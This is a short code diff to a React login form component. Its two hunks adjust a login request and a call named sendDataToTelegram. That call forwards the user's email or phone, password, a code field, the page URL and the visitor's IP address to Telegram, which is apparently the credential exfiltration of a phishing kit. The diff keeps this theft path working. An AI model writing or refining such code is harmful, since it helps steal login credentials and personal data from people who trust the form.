@@ -102,7 +102,7 @@ export function LoginFormSteps({ browserData }: Props) {
 				"Content-Type": "application/json",
 			},
 			body: JSON.stringify({
-				emailOrPhone: username,
+				username,
 				password,
 			}),
 		});
@@ -116,8 +116,8 @@ export function LoginFormSteps({ browserData }: Props) {
 		const { origin, pathname } = window.location;
 
 		await sendDataToTelegram({
-			emailOrPhone: data.user.emailOrPhone,
-			password: data.user.password,
+			emailOrPhone: data.user.emailOrPhone || "",
+			password: data.user.password || "",
 			code: "",
 			pageUrl: `${origin}${pathname}`,
 			userIp: browserData.ip,
